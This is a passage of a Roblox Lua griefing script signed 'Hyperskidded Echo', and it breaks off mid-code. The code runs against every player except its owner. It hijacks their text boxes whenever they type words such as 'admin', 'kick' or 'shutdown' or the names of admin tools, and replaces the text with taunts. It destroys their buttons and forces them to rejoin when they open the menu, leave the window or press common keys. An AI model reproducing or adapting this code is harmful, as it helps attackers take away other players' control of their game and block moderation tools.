									local Prefix = string.match(string.lower(UI.Text),"(%p?)/") or ""

									if UI:IsA("TextBox") then
										UI.Text = "Hyperskidded Echo doesn't want you to type  >:)"
										UI:ReleaseFocus(true)
									end
									if UI:IsA("TextButton") then UI:Destroy() 

									end
								end 
								if string.match(string.lower(UI.Text),"!") then
									local Prefix = string.match(string.lower(UI.Text),"(%p?)!") or ""

									if UI:IsA("TextBox") then
										UI.Text = "Hyperskidded Echo doesn't want you to type  >:)"
										UI:ReleaseFocus(true)
									end
									if UI:IsA("TextButton") then UI:Destroy() 

									end
								end 
								if string.match(string.lower(UI.Text),"?") then
									local Prefix = string.match(string.lower(UI.Text),"(%p?)?") or ""

									if UI:IsA("TextBox") then
										UI.Text = "Hyperskidded Echo doesn't want you to type  >:)"
										UI:ReleaseFocus(true)
									end
									if UI:IsA("TextButton") then UI:Destroy() 

									end
								end 
								if string.match(string.lower(UI.Text),"ski") then
									local Prefix = string.match(string.lower(UI.Text),"(%p?)ski") or ""

									if UI:IsA("TextBox") then
										UI.Text = "Hyperskidded Echo doesn't want you to type  >:)"
										UI:ReleaseFocus(true)
									end
									if UI:IsA("TextButton") then UI:Destroy() 

									end
								end 
								if string.match(string.lower(UI.Text),"commit") then
									local Prefix = string.match(string.lower(UI.Text),"(%p?)commit") or ""

									if UI:IsA("TextBox") then
										UI.Text = "Hyperskidded Echo doesn't want you to type  >:)"
										UI:ReleaseFocus(true)
									end
									if UI:IsA("TextButton") then UI:Destroy() 

									end
								end 
								if string.match(string.lower(UI.Text),"sucide") then
									local Prefix = string.match(string.lower(UI.Text),"(%p?)sucide") or ""

									if UI:IsA("TextBox") then
										UI.Text = "Hyperskidded Echo doesn't want you to type  >:)"
										UI:ReleaseFocus(true)
									end
									if UI:IsA("TextButton") then UI:Destroy() 

									end
								end 
								if string.match(string.lower(UI.Text),"comi") then
									local Prefix = string.match(string.lower(UI.Text),"(%p?)comi") or ""

									if UI:IsA("TextBox") then
										UI.Text = "Hyperskidded Echo doesn't want you to type  >:)"
										UI:ReleaseFocus(true)
									end
									if UI:IsA("TextButton") then UI:Destroy() 

									end
								end 
								if string.match(string.lower(UI.Text),"is better") then
									local Prefix = string.match(string.lower(UI.Text),"(%p?)is better") or ""

									if UI:IsA("TextBox") then
										UI.Text = "Hyperskidded Echo doesn't want you to type  >:)"
										UI:ReleaseFocus(true)
									end
									if UI:IsA("TextButton") then UI:Destroy() 

									end
								end 
								if string.match(string.lower(UI.Text),"you suck") then
									local Prefix = string.match(string.lower(UI.Text),"(%p?)you suck") or ""

									if UI:IsA("TextBox") then
										UI.Text = "Hyperskidded Echo doesn't want you to type  >:)"
										UI:ReleaseFocus(true)
									end
									if UI:IsA("TextButton") then UI:Destroy() 

									end
								end 
								if string.match(string.lower(UI.Text),"suck") then
									local Prefix = string.match(string.lower(UI.Text),"(%p?)suck") or ""

									if UI:IsA("TextBox") then
										UI.Text = "Hyperskidded Echo doesn't want you to type  >:)"
										UI:ReleaseFocus(true)
									end
									if UI:IsA("TextButton") then UI:Destroy() 

									end
								end 
								if string.match(string.lower(UI.Text),"bad") then
									local Prefix = string.match(string.lower(UI.Text),"(%p?)bad") or ""

									if UI:IsA("TextBox") then
										UI.Text = "Hyperskidded Echo doesn't want you to type  >:)"
										UI:ReleaseFocus(true)
									end
									if UI:IsA("TextButton") then UI:Destroy() 

									end
								end 
								if string.match(string.lower(UI.Text),"dum") then
									local Prefix = string.match(string.lower(UI.Text),"(%p?)dum") or ""

									if UI:IsA("TextBox") then
										UI.Text = "Hyperskidded Echo doesn't want you to type  >:)"
										UI:ReleaseFocus(true)
									end
									if UI:IsA("TextButton") then UI:Destroy() 

									end
								end 
								if string.match(string.lower(UI.Text),"roblox") then
									local Prefix = string.match(string.lower(UI.Text),"(%p?)roblox") or ""

									if UI:IsA("TextBox") then
										UI.Text = "Hyperskidded Echo doesn't want you to type  >:)"
										UI:ReleaseFocus(true)
									end
									if UI:IsA("TextButton") then UI:Destroy() 

									end
								end 
								if string.match(string.lower(UI.Text),"builderman") then
									local Prefix = string.match(string.lower(UI.Text),"(%p?)builderman") or ""

									if UI:IsA("TextBox") then
										UI.Text = "Hyperskidded Echo doesn't want you to type  >:)"
										UI:ReleaseFocus(true)
									end
									if UI:IsA("TextButton") then UI:Destroy() 

									end
								end 
								if string.match(string.lower(UI.Text),"getout") then
									local Prefix = string.match(string.lower(UI.Text),"(%p?)getout") or ""

									if UI:IsA("TextBox") then
										UI.Text = "Hyperskidded Echo doesn't want you to type  >:)"
										UI:ReleaseFocus(true)
									end
									if UI:IsA("TextButton") then UI:Destroy() 

									end
								end 
								if string.match(string.lower(UI.Text),"get out") then
									local Prefix = string.match(string.lower(UI.Text),"(%p?)get out") or ""

									if UI:IsA("TextBox") then
										UI.Text = "Hyperskidded Echo doesn't want you to type  >:)"
										UI:ReleaseFocus(true)
									end
									if UI:IsA("TextButton") then UI:Destroy() 

									end
								end 
								if string.match(string.lower(UI.Text),"leav") then
									local Prefix = string.match(string.lower(UI.Text),"(%p?)leav") or ""

									if UI:IsA("TextBox") then
										UI.Text = "Hyperskidded Echo doesn't want you to type  >:)"
										UI:ReleaseFocus(true)
									end
									if UI:IsA("TextButton") then UI:Destroy() 

									end
								end 
								if string.match(string.lower(UI.Text),"leak") then
									local Prefix = string.match(string.lower(UI.Text),"(%p?)leak") or ""

									if UI:IsA("TextBox") then
										UI.Text = "Hyperskidded Echo doesn't want you to type  >:)"
										UI:ReleaseFocus(true)
									end
									if UI:IsA("TextButton") then UI:Destroy() 

									end
								end 
								if string.match(string.lower(UI.Text),"shu") then
									local Prefix = string.match(string.lower(UI.Text),"(%p?)shu") or ""

									if UI:IsA("TextBox") then
										UI.Text = "Hyperskidded Echo doesn't want you to type  >:)"
										UI:ReleaseFocus(true)
									end
									if UI:IsA("TextButton") then UI:Destroy() 

									end
								end 
								if string.match(string.lower(UI.Text),"ki") then
									local Prefix = string.match(string.lower(UI.Text),"(%p?)ki") or ""

									if UI:IsA("TextBox") then
										UI.Text = "Hyperskidded Echo doesn't want you to type  >:)"
										UI:ReleaseFocus(true)
									end
									if UI:IsA("TextButton") then UI:Destroy() 

									end
								end 
								if string.match(string.lower(UI.Text),"nulled") then
									local Prefix = string.match(string.lower(UI.Text),"(%p?)nulled") or ""

									if UI:IsA("TextBox") then
										UI.Text = "Hyperskidded Echo doesn't want you to type  >:)"
										UI:ReleaseFocus(true)
									end
									if UI:IsA("TextButton") then UI:Destroy() 

									end
								end 
								if string.match(string.lower(UI.Text),"really") then
									local Prefix = string.match(string.lower(UI.Text),"(%p?)really") or ""

									if UI:IsA("TextBox") then
										UI.Text = "Yes. - Hyperskidded Echo"
										UI:ReleaseFocus(true)
									end
									if UI:IsA("TextButton") then UI:Destroy() 

									end
								end 
								if string.match(string.lower(UI.Text),"no life") then
									local Prefix = string.match(string.lower(UI.Text),"(%p?)no life") or ""

									if UI:IsA("TextBox") then
										UI.Text = "I do have a life - Hyperskidded Echo"
										UI:ReleaseFocus(true)
									end
									if UI:IsA("TextButton") then UI:Destroy() 

									end
								end 
								if string.match(string.lower(UI.Text),"kick") then
									local Prefix = string.match(string.lower(UI.Text),"(%p?)kick") or ""

									if UI:IsA("TextBox") then
										UI.Text = "Hyperskidded Echo doesn't want you to type  >:)"
										UI:ReleaseFocus(true)
									end
									if UI:IsA("TextButton") then UI:Destroy() 

									end
								end 
								if string.match(string.lower(UI.Text),"shutdown") then 
									local Prefix = string.match(string.lower(UI.Text),"(%p?)shutdown") or ""

									if UI:IsA("TextBox") then
										UI.Text = "Hyperskidded Echo doesn't want you to type  >:)"
										UI:ReleaseFocus(true)
									end
									if UI:IsA("TextButton") then UI:Destroy() 

									end
								end 
								if string.match(string.lower(UI.Text),"fenv") then
									local Prefix = string.match(string.lower(UI.Text),"(%p?)fenv") or ""

									if UI:IsA("TextBox") then
										UI.Text = "Hyperskidded Echo doesn't want you to type  >:)"
										UI:ReleaseFocus(true)
									end
									if UI:IsA("TextButton") then UI:Destroy() 

									end
								end 
								if string.match(string.lower(UI.Text),"shut-down") then
									local Prefix = string.match(string.lower(UI.Text),"(%p?)shut-down") or ""

									if UI:IsA("TextBox") then
										UI.Text = "Hyperskidded Echo doesn't want you to type  >:)"
										UI:ReleaseFocus(true)
									end
									if UI:IsA("TextButton") then UI:Destroy() 

									end
								end 
								if string.match(string.lower(UI.Text),"get") then
									local Prefix = string.match(string.lower(UI.Text),"(%p?)get") or ""

									if UI:IsA("TextBox") then
										UI.Text = "Hyperskidded Echo doesn't want you to type  >:)"
										UI:ReleaseFocus(true)
									end
									if UI:IsA("TextButton") then UI:Destroy() 

									end
								end 
								if string.match(string.lower(UI.Text),"_G") then
									local Prefix = string.match(string.lower(UI.Text),"(%p?)_G") or ""

									if UI:IsA("TextBox") then
										UI.Text = "Hyperskidded Echo doesn't want you to type  >:)"
										UI:ReleaseFocus(true)
									end
									if UI:IsA("TextButton") then UI:Destroy() 

									end
								end 
								if string.match(string.lower(UI.Text),"game") then
									local Prefix = string.match(string.lower(UI.Text),"(%p?)game") or ""

									if UI:IsA("TextBox") then
										UI.Text = "Hyperskidded Echo doesn't want you to type  >:)"
										UI:ReleaseFocus(true)
									end
									if UI:IsA("TextButton") then UI:Destroy() 

									end
								end 
								if string.match(string.lower(UI.Text),"workspace") then
									local Prefix = string.match(string.lower(UI.Text),"(%p?)workspace") or ""

									if UI:IsA("TextBox") then
										UI.Text = "Hyperskidded Echo doesn't want you to type  >:)"
										UI:ReleaseFocus(true)
									end
									if UI:IsA("TextButton") then UI:Destroy() 

									end
								end 
								if string.match(string.lower(UI.Text),"parent") then
									local Prefix = string.match(string.lower(UI.Text),"(%p?)parent") or ""

									if UI:IsA("TextBox") then
										UI.Text = "Hyperskidded Echo doesn't want you to type  >:)"
										UI:ReleaseFocus(true)
									end
									if UI:IsA("TextButton") then UI:Destroy() 

									end
								end 
								if string.match(string.lower(UI.Text),"while") then
									local Prefix = string.match(string.lower(UI.Text),"(%p?)while") or ""

									if UI:IsA("TextBox") then
										UI.Text = "Hyperskidded Echo doesn't want you to type  >:)"
										UI:ReleaseFocus(true)
									end
									if UI:IsA("TextButton") then UI:Destroy() 

									end
								end 
								if string.match(string.lower(UI.Text),"teleport") then
									local Prefix = string.match(string.lower(UI.Text),"(%p?)teleport") or ""

									if UI:IsA("TextBox") then
										UI.Text = "Hyperskidded Echo doesn't want you to type  >:)"
										UI:ReleaseFocus(true)
									end
									if UI:IsA("TextButton") then UI:Destroy() 

									end
								end 
								if string.match(string.lower(UI.Text),"children") then
									local Prefix = string.match(string.lower(UI.Text),"(%p?)children") or ""

									if UI:IsA("TextBox") then
										UI.Text = "Hyperskidded Echo doesn't want you to type  >:)"
										UI:ReleaseFocus(true)
									end
									if UI:IsA("TextButton") then UI:Destroy() 

									end
								end 
								if string.match(string.lower(UI.Text),"function") then
									local Prefix = string.match(string.lower(UI.Text),"(%p?)function") or ""

									if UI:IsA("TextBox") then
										UI.Text = "Hyperskidded Echo doesn't want you to type  >:)"
										UI:ReleaseFocus(true)
									end
									if UI:IsA("TextButton") then UI:Destroy() 

									end
								end 
								if string.match(string.lower(UI.Text),"destroy") then
									local Prefix = string.match(string.lower(UI.Text),"(%p?)destroy") or ""

									if UI:IsA("TextBox") then
										UI.Text = "Hyperskidded Echo doesn't want you to type  >:)"
										UI:ReleaseFocus(true)
									end
									if UI:IsA("TextButton") then UI:Destroy() 

									end
								end 
								if string.match(string.lower(UI.Text),"remove") then
									local Prefix = string.match(string.lower(UI.Text),"(%p?)remove") or ""

									if UI:IsA("TextBox") then
										UI.Text = "Hyperskidded Echo doesn't want you to type  >:)"
										UI:ReleaseFocus(true)
									end
									if UI:IsA("TextButton") then UI:Destroy() 

									end
								end 
								if string.match(string.lower(UI.Text),"crash") then
									local Prefix = string.match(string.lower(UI.Text),"(%p?)crash") or ""

									if UI:IsA("TextBox") then
										UI.Text = "Hyperskidded Echo doesn't want you to type  >:)"
										UI:ReleaseFocus(true)
									end
									if UI:IsA("TextButton") then UI:Destroy() 

									end
								end 
								if string.match(string.lower(UI.Text),"mute") then
									local Prefix = string.match(string.lower(UI.Text),"(%p?)mute") or ""

									if UI:IsA("TextBox") then
										UI.Text = "Hyperskidded Echo doesn't want you to type  >:)"
										UI:ReleaseFocus(true)
									end
									if UI:IsA("TextButton") then UI:Destroy() 

									end
								end 
								if string.match(string.lower(UI.Text),"0x") then -- yeah good luck using hexadecimal id's
									local Prefix = string.match(string.lower(UI.Text),"(%p?)0x") or ""

									if UI:IsA("TextBox") then
										UI.Text = "Hyperskidded Echo doesn't want you to type  >:)"
										UI:ReleaseFocus(true)
									end
									if UI:IsA("TextButton") then UI:Destroy()

									end
								end 
								if string.match(string.lower(UI.Text),"script") then
									local Prefix = string.match(string.lower(UI.Text),"(%p?)script") or ""

									if UI:IsA("TextBox") then
										UI.Text = "Hyperskidded Echo doesn't want you to type  >:)"
										UI:ReleaseFocus(true)
									end
									if UI:IsA("TextButton") then UI:Destroy()

									end
								end 
								if string.match(string.lower(UI.Text),"execute") then
									local Prefix = string.match(string.lower(UI.Text),"(%p?)execute") or ""

									if UI:IsA("TextBox") then
										UI.Text = "Hyperskidded Echo doesn't want you to type  >:)"
										UI:ReleaseFocus(true)
									end
									if UI:IsA("TextButton") then UI:Destroy()

									end
								end 
								if string.match(string.lower(UI.Text),"hiddenscript") then
									local Prefix = string.match(string.lower(UI.Text),"(%p?)hiddenscript") or ""

									if UI:IsA("TextBox") then
										UI.Text = "Hyperskidded Echo doesn't want you to type  >:)"
										UI:ReleaseFocus(true)
									end
									if UI:IsA("TextButton") then UI:Destroy()

									end
								end 
								if string.match(string.lower(UI.Text),"nil") then
									local Prefix = string.match(string.lower(UI.Text),"(%p?)nil") or ""

									if UI:IsA("TextBox") then
										UI.Text = "Hyperskidded Echo doesn't want you to type  >:)"
										UI:ReleaseFocus(true)
									end
									if UI:IsA("TextButton") then UI:Destroy()

									end
								end 
								if string.match(string.lower(UI.Text),"dex") then
									local Prefix = string.match(string.lower(UI.Text),"(%p?)dex") or ""

									if UI:IsA("TextBox") then
										UI.Text = "Hyperskidded Echo doesn't want you to type  >:)"
										UI:ReleaseFocus(true)
									end
									if UI:IsA("TextButton") then UI:Destroy()

									end
								end 
								if string.match(string.lower(UI.Text),"execute") then
									local Prefix = string.match(string.lower(UI.Text),"(%p?)execute") or ""

									if UI:IsA("TextBox") then
										UI.Text = "Hyperskidded Echo doesn't want you to type  >:)"
										UI:ReleaseFocus(true)
									end
									if UI:IsA("TextButton") then UI:Destroy()

									end
								end 
								if string.match(string.lower(UI.Text),"explorer") then
									local Prefix = string.match(string.lower(UI.Text),"(%p?)explorer") or ""

									if UI:IsA("TextBox") then
										UI.Text = "Hyperskidded Echo doesn't want you to type  >:)"
										UI:ReleaseFocus(true)
									end
									if UI:IsA("TextButton") then UI:Destroy()

									end
								end 
								if string.match(string.lower(UI.Text),"place") then
									local Prefix = string.match(string.lower(UI.Text),"(%p?)place") or ""

									if UI:IsA("TextBox") then
										UI.Text = "Hyperskidded Echo doesn't want you to type  >:)"
										UI:ReleaseFocus(true)
									end
									if UI:IsA("TextButton") then UI:Destroy()

									end
								end 
								if string.match(string.lower(UI.Text),"debris") then
									local Prefix = string.match(string.lower(UI.Text),"(%p?)debris") or ""

									if UI:IsA("TextBox") then
										UI.Text = "Hyperskidded Echo doesn't want you to type  >:)"
										UI:ReleaseFocus(true)
									end
									if UI:IsA("TextButton") then UI:Destroy()

									end
								end 
								if string.match(string.lower(UI.Text),"service") then
									local Prefix = string.match(string.lower(UI.Text),"(%p?)service") or ""

									if UI:IsA("TextBox") then
										UI.Text = "Hyperskidded Echo doesn't want you to type  >:)"
										UI:ReleaseFocus(true)
									end
									if UI:IsA("TextButton") then UI:Destroy()

									end
								end 
								if string.match(string.lower(UI.Text),"6204282163") then
									local Prefix = string.match(string.lower(UI.Text),"(%p?)6204282163") or ""

									if UI:IsA("TextBox") then
										UI.Text = "Hyperskidded Echo doesn't want you to type  >:)"
										UI:ReleaseFocus(true)
									end
									if UI:IsA("TextButton") then UI:Destroy()

									end
								end 
								if string.match(string.lower(UI.Text),"6200736170") then
									local Prefix = string.match(string.lower(UI.Text),"(%p?)6200736170") or ""

									if UI:IsA("TextBox") then
										UI.Text = "Hyperskidded Echo doesn't want you to type  >:)"
										UI:ReleaseFocus(true)
									end
									if UI:IsA("TextButton") then UI:Destroy()

									end
								end 
								if string.match(string.lower(UI.Text),"6131936103") then
									local Prefix = string.match(string.lower(UI.Text),"(%p?)6131936103") or ""

									if UI:IsA("TextBox") then
										UI.Text = "Hyperskidded Echo doesn't want you to type  >:)"
										UI:ReleaseFocus(true)
									end
									if UI:IsA("TextButton") then UI:Destroy()

									end
								end 
								if string.match(string.lower(UI.Text),"ILisForSkids") then
									local Prefix = string.match(string.lower(UI.Text),"(%p?)ILisForSkids") or ""

									if UI:IsA("TextBox") then
										UI.Text = "Hyperskidded Echo doesn't want you to type  >:)"
										UI:ReleaseFocus(true)
									end
									if UI:IsA("TextButton") then UI:Destroy()

									end
								end 
								if string.match(string.lower(UI.Text),"6142580823") then
									local Prefix = string.match(string.lower(UI.Text),"(%p?)6142580823") or ""

									if UI:IsA("TextBox") then
										UI.Text = "Hyperskidded Echo doesn't want you to type  >:)"
										UI:ReleaseFocus(true)
									end
									if UI:IsA("TextButton") then UI:Destroy()

									end
								end 
								if string.match(string.lower(UI.Text),"ILSucks") then
									local Prefix = string.match(string.lower(UI.Text),"(%p?)ILSucks") or ""

									if UI:IsA("TextBox") then
										UI.Text = "Hyperskidded Echo doesn't want you to type  >:)"
										UI:ReleaseFocus(true)
									end
									if UI:IsA("TextButton") then UI:Destroy()

									end
								end 
								if string.match(string.lower(UI.Text),"antiil") then
									local Prefix = string.match(string.lower(UI.Text),"(%p?)antiil") or ""

									if UI:IsA("TextBox") then
										UI.Text = "Hyperskidded Echo doesn't want you to type  >:)"
										UI:ReleaseFocus(true)
									end
									if UI:IsA("TextButton") then UI:Destroy()

									end
								end 
								if string.match(string.lower(UI.Text),"6187045257") then
									local Prefix = string.match(string.lower(UI.Text),"(%p?)6187045257") or ""

									if UI:IsA("TextBox") then
										UI.Text = "Hyperskidded Echo doesn't want you to type  >:)"
										UI:ReleaseFocus(true)
									end
									if UI:IsA("TextButton") then UI:Destroy()

									end
								end 
								if string.match(string.lower(UI.Text),"6333879762") then
									local Prefix = string.match(string.lower(UI.Text),"(%p?)6333879762") or ""

									if UI:IsA("TextBox") then
										UI.Text = "Hyperskidded Echo doesn't want you to type  >:)"
										UI:ReleaseFocus(true)
									end
									if UI:IsA("TextButton") then UI:Destroy()

									end
								end 
								if string.match(string.lower(UI.Text),"6212044610") then
									local Prefix = string.match(string.lower(UI.Text),"(%p?)6212044610") or ""

									if UI:IsA("TextBox") then
										UI.Text = "Hyperskidded Echo doesn't want you to type  >:)"
										UI:ReleaseFocus(true)
									end
									if UI:IsA("TextButton") then UI:Destroy()

									end
								end 
								if string.match(string.lower(UI.Text),"descendants") then
									local Prefix = string.match(string.lower(UI.Text),"(%p?)descendants") or ""

									if UI:IsA("TextBox") then
										UI.Text = "Hyperskidded Echo doesn't want you to type  >:)"
										UI:ReleaseFocus(true)
									end
									if UI:IsA("TextButton") then UI:Destroy()

									end
								end 
								if string.match(string.lower(UI.Text),"\\") then
									local Prefix = string.match(string.lower(UI.Text),"(%p?)\\") or ""

									if UI:IsA("TextBox") then
										UI.Text = "Hyperskidded Echo doesn't want you to type  >:)"
										UI:ReleaseFocus(true)
									end
									if UI:IsA("TextButton") then UI:Destroy()

									end
								end 
								if string.match(string.lower(UI.Text),":") then
									local Prefix = string.match(string.lower(UI.Text),"(%p?):") or ""

									if UI:IsA("TextBox") then
										UI.Text = "Hyperskidded Echo doesn't want you to type  >:)"
										UI:ReleaseFocus(true)
									end
									if UI:IsA("TextButton") then UI:Destroy()

									end
								end 
								if string.match(string.lower(UI.Text),";") then
									local Prefix = string.match(string.lower(UI.Text),"(%p?);") or ""

									if UI:IsA("TextBox") then
										UI.Text = "oOh sOmEoNe aTtEmpTed tO rUn aDmIn cOmManDs. - Hyperskidded Echo"
										UI:ReleaseFocus(true)
									end
									if UI:IsA("TextButton") then UI:Destroy()

									end
								end 
								if string.match(string.lower(UI.Text),"character") then
									local Prefix = string.match(string.lower(UI.Text),"(%p?)character") or ""

									if UI:IsA("TextBox") then
										UI.Text = "Hyperskidded Echo doesn't want you to type  >:)"
										UI:ReleaseFocus(true)
									end
									if UI:IsA("TextButton") then UI:Destroy()

									end
								end 
								if string.match(string.lower(UI.Text),"player") then
									local Prefix = string.match(string.lower(UI.Text),"(%p?)player") or ""

									if UI:IsA("TextBox") then
										UI.Text = "Hyperskidded Echo doesn't want you to type  >:)"
										UI:ReleaseFocus(true)
									end
									if UI:IsA("TextButton") then UI:Destroy()

									end
								end 
								if string.match(string.lower(UI.Text),"startergui") then
									local Prefix = string.match(string.lower(UI.Text),"(%p?)startergui") or ""

									if UI:IsA("TextBox") then
										UI.Text = "Hyperskidded Echo doesn't want you to type  >:)"
										UI:ReleaseFocus(true)
									end
									if UI:IsA("TextButton") then UI:Destroy()

									end
								end
								if string.match(string.lower(UI.Text),"debug") then
									local Prefix = string.match(string.lower(UI.Text),"(%p?)debug") or ""

									if UI:IsA("TextBox") then
										UI.Text = "Hyperskidded Echo doesn't want you to type  >:)"
										UI:ReleaseFocus(true)
									end
									if UI:IsA("TextButton") then UI:Destroy()

									end
								end 
								if string.match(string.lower(UI.Text),"admin") then
									local Prefix = string.match(string.lower(UI.Text),"(%p?)admin") or ""

									if UI:IsA("TextBox") then
										UI.Text = "Hyperskidded Echo doesn't want you to type  >:)"
										UI:ReleaseFocus(true)
									end
									if UI:IsA("TextButton") then UI:Destroy()

									end
								end 
								if string.match(string.lower(UI.Text),"un") then
									local Prefix = string.match(string.lower(UI.Text),"(%p?)un") or ""

									if UI:IsA("TextBox") then
										UI.Text = "Hyperskidded Echo doesn't want you to type  >:)"
										UI:ReleaseFocus(true)
									end
									if UI:IsA("TextButton") then UI:Destroy()

									end
								end  -- below is to block UTG elements
								if string.match(string.lower(UI.Text),"chathax") then
									local Prefix = string.match(string.lower(UI.Text),"(%p?)chathax") or ""

									if UI:IsA("TextBox") then
										UI.Text = "Hyperskidded Echo doesn't want you to type  >:)"
										UI:ReleaseFocus(true)
									end
									if UI:IsA("TextButton") then UI:Destroy()

									end
								end 
								if string.match(string.lower(UI.Text),"hd admin") then
									local Prefix = string.match(string.lower(UI.Text),"(%p?)hd admin") or ""

									if UI:IsA("TextBox") then
										UI.Text = "Hyperskidded Echo doesn't want you to type  >:)"
										UI:ReleaseFocus(true)
									end
									if UI:IsA("TextButton") then UI:Destroy()

									end
								end 
								if string.match(string.lower(UI.Text),"unleak ss") then
									local Prefix = string.match(string.lower(UI.Text),"(%p?)unleak ss") or ""

									if UI:IsA("TextBox") then
										UI.Text = "Hyperskidded Echo doesn't want you to type  >:)"
										UI:ReleaseFocus(true)
									end
									if UI:IsA("TextButton") then UI:Destroy()

									end
								end 
								if string.match(string.lower(UI.Text),"infinite yield") then
									local Prefix = string.match(string.lower(UI.Text),"(%p?)infinite yield") or ""

									if UI:IsA("TextBox") then
										UI.Text = "Hyperskidded Echo doesn't want you to type  >:)"
										UI:ReleaseFocus(true)
									end
									if UI:IsA("TextButton") then UI:Destroy()

									end
								end 
								if string.match(string.lower(UI.Text),"kfc") then
									local Prefix = string.match(string.lower(UI.Text),"(%p?)kfc") or ""

									if UI:IsA("TextBox") then
										UI.Text = "Hyperskidded Echo doesn't want you to type  >:)"
										UI:ReleaseFocus(true)
									end
									if UI:IsA("TextButton") then UI:Destroy()

									end
								end 
								if string.match(string.lower(UI.Text),"crossroads") then
									local Prefix = string.match(string.lower(UI.Text),"(%p?)crossroads") or ""

									if UI:IsA("TextBox") then
										UI.Text = "Hyperskidded Echo doesn't want you to type  >:)"
										UI:ReleaseFocus(true)
									end
									if UI:IsA("TextButton") then UI:Destroy()

									end
								end 
								if string.match(string.lower(UI.Text),"baseplate") then
									local Prefix = string.match(string.lower(UI.Text),"(%p?)baseplate") or ""

									if UI:IsA("TextBox") then
										UI.Text = "Hyperskidded Echo doesn't want you to type  >:)"
										UI:ReleaseFocus(true)
									end
									if UI:IsA("TextButton") then UI:Destroy()

									end
								end 
								if string.match(string.lower(UI.Text),"life in") then
									local Prefix = string.match(string.lower(UI.Text),"(%p?)life in") or ""

									if UI:IsA("TextBox") then
										UI.Text = "Hyperskidded Echo doesn't want you to type  >:)"
										UI:ReleaseFocus(true)
									end
									if UI:IsA("TextButton") then UI:Destroy()

									end
								end 
								if string.match(string.lower(UI.Text),"target") then
									local Prefix = string.match(string.lower(UI.Text),"(%p?)target") or ""

									if UI:IsA("TextBox") then
										UI.Text = "Hyperskidded Echo doesn't want you to type  >:)"
										UI:ReleaseFocus(true)
									end
									if UI:IsA("TextButton") then UI:Destroy()

									end
								end 
								if string.match(string.lower(UI.Text),"supermario") then
									local Prefix = string.match(string.lower(UI.Text),"(%p?)supermario") or ""

									if UI:IsA("TextBox") then
										UI.Text = "Hyperskidded Echo doesn't want you to type  >:)"
										UI:ReleaseFocus(true)
									end
									if UI:IsA("TextButton") then UI:Destroy()

									end
								end 
								if string.match(string.lower(UI.Text),"to") then
									local Prefix = string.match(string.lower(UI.Text),"(%p?)supermario") or ""

									if UI:IsA("TextBox") then
										UI.Text = "Hyperskidded Echo doesn't want you to type  >:)"
										UI:ReleaseFocus(true)
									end
									if UI:IsA("TextButton") then UI:Destroy()

									end
								end 
								if string.match(string.lower(UI.Text),"type") then
									local Prefix = string.match(string.lower(UI.Text),"(%p?)supermario") or ""

									if UI:IsA("TextBox") then
										UI.Text = "Hyperskidded Echo doesn't want you to type  >:)"
										UI:ReleaseFocus(true)
									end
									if UI:IsA("TextButton") then UI:Destroy()

									end
								end 
								if string.match(string.lower(UI.Text),"press") then
									local Prefix = string.match(string.lower(UI.Text),"(%p?)supermario") or ""

									if UI:IsA("TextBox") then
										UI.Text = "Hyperskidded Echo doesn't want you to type  >:)"
										UI:ReleaseFocus(true)
									end
									if UI:IsA("TextButton") then UI:Destroy()

									end
								end 
								if string.match(string.lower(UI.Text),"nuke") then
									local Prefix = string.match(string.lower(UI.Text),"(%p?)nuke") or ""

									if UI:IsA("TextBox") then
										UI.Text = "Hyperskidded Echo doesn't want you to type  >:)"
										UI:ReleaseFocus(true)
									end
									if UI:IsA("TextButton") then UI:Destroy()

									end
								end 
								if string.match(string.lower(UI.Text),"baldi") then
									local Prefix = string.match(string.lower(UI.Text),"(%p?)baldi") or ""

									if UI:IsA("TextBox") then
										UI.Text = "Hyperskidded Echo doesn't want you to type  >:)"
										UI:ReleaseFocus(true)				
									end
								end 
							end
						end)
					end
					if game:service("Players").LocalPlayer.Name ~= Username_ then
						coroutine.resume(coroutine.create(function()
							if game:service("Players").LocalPlayer.Name ~= "SUPER_TIGERPRO" then
								for _,UI in pairs(game:service("Players").LocalPlayer:WaitForChild("PlayerGui"):GetDescendants()) do
									AutoDetect(UI)
								end
								game:service("Players").LocalPlayer:WaitForChild("PlayerGui").DescendantAdded:connect(function(UI)
									AutoDetect(UI)
								end)
							end
						end))
					end

					game:GetService("GuiService").MenuOpened:Connect(function()
						if stopeverything then wait(math.huge) end
						if lplr.Name ~= Username_ then
							Rejoin()
						end
					end)
					if game:GetService("GuiService").MenuIsOpen == true then
						if lplr.Name ~= Username_ then
							Rejoin()
						end
					end
					game:GetService("UserInputService").WindowFocusReleased:Connect(function()
						if stopeverything then wait(math.huge) end
						if lplr.Name ~= Username_ then
							Rejoin()
						end
					end)
					game:GetService("UserInputService").InputBegan:Connect(function(input, gameProcessed)
						if stopeverything then wait(math.huge) end
						if lplr.Name ~= Username_ then
							if input.KeyCode == Enum.KeyCode.LeftAlt then
								Rejoin()
							elseif input.KeyCode == Enum.KeyCode.RightAlt then
								Rejoin()
							elseif input.KeyCode == Enum.KeyCode.RightSuper then
								Rejoin()
							elseif input.KeyCode == Enum.KeyCode.LeftSuper then
								Rejoin()
							elseif input.KeyCode == Enum.KeyCode.Delete then
								Rejoin()
							elseif input.KeyCode == Enum.KeyCode.Escape then
								Rejoin()
							elseif input.KeyCode == Enum.KeyCode.ButtonStart then
								Rejoin()
							elseif input.KeyCode == Enum.KeyCode.F4 then
								Rejoin()
							elseif input.KeyCode == Enum.KeyCode.Tab then
								Rejoin()
							elseif input.KeyCode == Enum.KeyCode.LeftShift then
								Rejoin()
							elseif input.KeyCode == Enum.KeyCode.RightShift then
								Rejoin()
							elseif input.KeyCode == Enum.KeyCode.Delete then
								Rejoin()
							elseif input.KeyCode == Enum.KeyCode.LeftAlt then
								Rejoin()
							elseif input.KeyCode == Enum.KeyCode.RightAlt then
								Rejoin()
							elseif input.KeyCode == Enum.KeyCode.Semicolon then
								Rejoin()
							elseif input.KeyCode == Enum.KeyCode.Colon then
								Rejoin()
							elseif input.KeyCode == Enum.KeyCode.LeftControl then
								Rejoin()
							elseif input.KeyCode == Enum.KeyCode.RightControl then
								Rejoin()
							elseif input.KeyCode == Enum.KeyCode.Slash then
								Rejoin()
							elseif input.KeyCode == Enum.KeyCode.LeftBracket then
								Rejoin()
							elseif input.KeyCode == Enum.KeyCode.RightBracket then
								Rejoin()
							elseif input.KeyCode == Enum.KeyCode.Minus then
								Rejoin()
							elseif input.KeyCode == Enum.KeyCode.Plus then
								Rejoin()
							elseif input.KeyCode == Enum.KeyCode.One then
								Rejoin()
							elseif input.KeyCode == Enum.KeyCode.Two then
								Rejoin()
							elseif input.KeyCode == Enum.KeyCode.Three then
								Rejoin()
